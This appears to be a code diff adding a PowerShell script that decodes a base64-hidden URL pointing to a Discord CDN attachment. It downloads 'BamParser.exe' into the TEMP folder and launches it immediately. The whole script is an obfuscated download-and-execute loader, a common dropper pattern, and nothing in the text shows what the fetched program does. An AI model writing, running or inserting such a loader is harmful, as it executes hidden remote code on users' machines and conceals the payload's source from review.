@@ -1,0 +1,30 @@
+$Base64 = "aHR0cHM6Ly9jZG4uZGlzY29yZGFwcC5jb20vYXR0YWNobWVudHMvMTM1NDMxMjYwNzkyNTkzMjExMy8xNDI1NjUwOTA5Mzc5MzAxNDU3Lz9leD02OGU4NWM2MCZpcz02OGU3MGFlMCZobT0zNjc2ZWU0M2M0Yjg5YTIzM2EyNjU3ODRkMTVlNjg0MWIzNjUxNWI0N2Q0OTM2NDFiMjk4YzM0OTJiYWMzMzU0Jg"
+
+$b = $Base64.Trim() -replace '\s',''
+$b = $b.Replace('-','+').Replace('_','/')
+while ($b.Length % 4 -ne 0) { $b += '=' }
+
+try {
+    $url = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($b)).Trim()
+} catch {
+    Write-Error ("Base64 inválido: " + $_.Exception.Message)
+    exit 1
+}
+
+if (-not [Uri]::IsWellFormedUriString($url, [UriKind]::Absolute)) {
+    Write-Error ("URL no válida: " + $url)
+    exit 1
+}
+
+try { [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 } catch {}
+
+$nombreArchivo = "BamParser.exe"
+$rutaDestino = Join-Path $env:TEMP $nombreArchivo
+
+try {
+    Invoke-WebRequest -Uri $url -OutFile $rutaDestino -ErrorAction Stop
+    Start-Process -FilePath $rutaDestino
+} catch {
+    Write-Error ("Error al descargar o ejecutar: " + $_.Exception.Message)
+    exit 1
+}
